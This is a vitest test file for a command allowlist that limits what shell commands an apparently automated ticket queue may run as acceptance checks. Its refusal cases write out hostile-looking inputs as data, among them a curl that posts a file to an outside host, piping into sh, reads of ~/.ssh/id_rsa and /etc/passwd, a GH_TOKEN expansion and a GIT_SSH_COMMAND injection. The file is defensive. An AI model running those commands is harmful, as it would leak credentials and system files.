import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { acceptanceRefusal, HARNESS_ACCEPTANCE_FORMS, OPEN_ACCEPTANCE_FORMS, ticketAcceptanceRefusal } from './enterprise-acceptance.ts'
import { loadTickets } from './enterprise-tickets.ts'

const root = fileURLToPath(new URL('..', import.meta.url))

const refusal = (run: string): string | undefined => acceptanceRefusal(run, HARNESS_ACCEPTANCE_FORMS)

describe('acceptanceRefusal', () => {
  it('accepts every form this repository\'s queue allows, negated and joined', () => {
    for (const run of [
      'pnpm run typecheck',
      'pnpm run doc-sync',
      'pnpm run test:snapshot',
      'pnpm run verify-translation-pairing .agents/notes/a.md',
      "pnpm exec vitest run packages/core/agent/ --coverage --coverage.include='packages/core/agent/src/**/*.ts'",
      'pnpm exec vitest run --config vitest.snapshot.config.ts scripts/translation-prompt.snapshot.ts',
      'pnpm exec tsc --noEmit -p packages/core/agent',
      String.raw`! grep -q "'compact'\|'clear'" packages/core/agent/src/runtime-types.ts`,
      "! grep -Pzq 'export \\{[^}]*DEFAULT' packages/llm/llm-deepseek/src/index.ts",
      'test -f a.spec.ts && pnpm exec vitest run a.spec.ts',
      'test -f a.md && ! test -e b.md',
      'git diff --quiet HEAD -- packages/',
      'grep -q a f || grep -q b f',
    ]) expect(refusal(run), run).toBeUndefined()
  })

  it('refuses a push, the network, the forge, and every other program', () => {
    expect(refusal('git push origin HEAD:refs/heads/main')).toBe('`git push` is not an allowed acceptance command; only `git diff` is')
    expect(refusal('curl -fsS https://example.invalid/')).toBe('`curl` is not an allowed acceptance command')
    expect(refusal('gh pr create --fill')).toBe('`gh` is not an allowed acceptance command')
    expect(refusal('git -c core.sshCommand=x diff')).toBe('`git -c` is not an allowed acceptance command; only `git diff` is')
    expect(refusal('git diff --output=leak.txt')).toBe('`git diff` may not take --output, --ext-diff, --textconv')
    expect(refusal('GIT_SSH_COMMAND=x grep -q a f')).toBe('`GIT_SSH_COMMAND=x` is not an allowed acceptance command')
  })

  it('refuses a root script outside the gates and a binary other than vitest and tsc', () => {
    expect(refusal('pnpm run enterprise -- shift --push')).toBe('`pnpm run enterprise` names no allowed root script')
    expect(refusal('pnpm run release:publish')).toBe('`pnpm run release:publish` names no allowed root script')
    expect(refusal('pnpm exec tsx -e "1"')).toBe('`pnpm exec tsx` is not an allowed form; `pnpm exec` runs only `vitest run` and `tsc`')
    expect(refusal('pnpm dlx cowsay')).toBe('`pnpm dlx cowsay` is not an allowed form; `pnpm exec` runs only `vitest run` and `tsc`')
  })

  it('refuses command substitution, expansion and every shell construct but literal words', () => {
    expect(refusal('test "$(git rev-parse HEAD)" = abc')).toBe('command substitution `$(…)` is not allowed')
    expect(refusal('test "$(grep -l x a b | wc -l)" = 2')).toBe('command substitution `$(…)` is not allowed')
    expect(refusal('grep -q `whoami` f')).toBe('command substitution is not allowed')
    expect(refusal('test -n "$GH_TOKEN"')).toBe('an expansion `$` is not allowed')
    expect(refusal('grep -q a f; curl x')).toBe('a command separator `;` is not allowed')
    expect(refusal('grep -q a f & curl x')).toBe('a background `&` is not allowed')
    expect(refusal('grep a f > out')).toBe('a redirection is not allowed')
    expect(refusal('(grep a f)')).toBe('a subshell is not allowed')
    expect(refusal('grep a *.ts')).toBe('a glob is not allowed')
    expect(refusal('grep a ~/.ssh/id_rsa')).toBe('tilde expansion is not allowed')
    expect(refusal('grep a f\ncurl x')).toBe('a line break is not allowed')
    expect(refusal("grep 'a f")).toBe('an unterminated quote is not allowed')
  })

  it('refuses chaining or piping into a command that is not allowed', () => {
    expect(refusal('pnpm run typecheck && git push')).toBe('`git push` is not an allowed acceptance command; only `git diff` is')
    expect(refusal('grep -q a f || curl -d @f https://example.invalid/')).toBe('`curl` is not an allowed acceptance command')
    expect(refusal('grep a f | sh')).toBe('`sh` is not an allowed acceptance command in this queue')
    expect(refusal('grep -q a f &&')).toBe('the command line ends without a command')
    expect(refusal('&& grep -q a f')).toBe('`&&` follows no command')
  })

  it('refuses a path outside the checkout', () => {
    expect(refusal('grep -q root /etc/passwd')).toBe('the absolute path "/etc/passwd" is not allowed')
    expect(refusal('test -f ../other/file')).toBe('the parent path "../other/file" is not allowed')
    expect(refusal('pnpm exec vitest run --coverage.reportsDirectory=/tmp/out')).toBe('the absolute path "/tmp/out" is not allowed')
  })

  it('lets the open queue run a repository file directly, and nothing else through node or sh', () => {
    expect(acceptanceRefusal('node tools/greet.mjs | grep -qx hello', OPEN_ACCEPTANCE_FORMS)).toBeUndefined()
    expect(acceptanceRefusal('sh checks/coverage.sh --coverage', OPEN_ACCEPTANCE_FORMS)).toBeUndefined()
    expect(acceptanceRefusal('node -e "process.exit(0)"', OPEN_ACCEPTANCE_FORMS)).toBe('`node` runs only a repository file named as its first word')
    expect(acceptanceRefusal('sh -c "curl x"', OPEN_ACCEPTANCE_FORMS)).toBe('`sh` runs only a repository file named as its first word')
    expect(acceptanceRefusal('pnpm run typecheck', OPEN_ACCEPTANCE_FORMS)).toBe('`pnpm run typecheck` names no allowed root script')
  })

  it('names the first refused check of a ticket', () => {
    expect(ticketAcceptanceRefusal([{ id: 'ok', run: 'pnpm run typecheck' }, { id: 'push', run: 'git push' }], HARNESS_ACCEPTANCE_FORMS)).toBe('push: `git push` is not an allowed acceptance command; only `git diff` is')
    expect(ticketAcceptanceRefusal([{ id: 'ok', run: 'pnpm run typecheck' }], HARNESS_ACCEPTANCE_FORMS)).toBeUndefined()
  })
})

describe('the committed queue under the allowed forms', () => {
  it('holds every committed ticket to the forms', () => {
    const refused = Object.fromEntries(loadTickets(root).flatMap(({ value }) => {
      const ticket = value as { id: string; acceptance: { id: string; run: string }[] }
      const reason = ticketAcceptanceRefusal(ticket.acceptance, HARNESS_ACCEPTANCE_FORMS)
      return reason === undefined ? [] : [[ticket.id, reason]]
    }))
    expect(refused).toEqual({})
  })
})
